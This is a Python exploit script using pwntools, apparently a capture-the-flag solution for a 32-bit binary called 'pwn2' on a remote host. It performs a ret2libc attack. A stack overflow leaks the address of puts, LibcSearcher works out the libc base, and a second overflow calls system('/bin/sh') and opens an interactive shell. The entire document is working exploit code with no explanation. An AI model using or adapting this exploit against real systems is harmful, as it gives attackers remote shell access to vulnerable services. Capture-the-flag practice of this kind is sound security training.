from pwn import *
from LibcSearcher import LibcSearcher
r = remote('vps1.blue-whale.me',9991)
elf=ELF('./pwn2')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x08048519
paylaod = 'a'*92 + p32(puts_plt) + p32(main) + p32(puts_got)
r.recvuntil("welcome to ROP world\n")
r.sendline(paylaod)
puts_addr = u32(r.recv()[0:4])
print "puts_addr:"+hex(puts_addr)

libc=LibcSearcher('puts',puts_addr)
#libc.dump("system")       
#libc.dump("str_bin_sh")    
#libc.dump("__libc_start_main_ret") 
#print(libc)

libcbase = puts_addr - libc.dump('puts')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

payload = 'a'*92 + p32(system_addr) + 'bbbb' + p32(binsh_addr)
r.sendline(payload)
r.interactive()
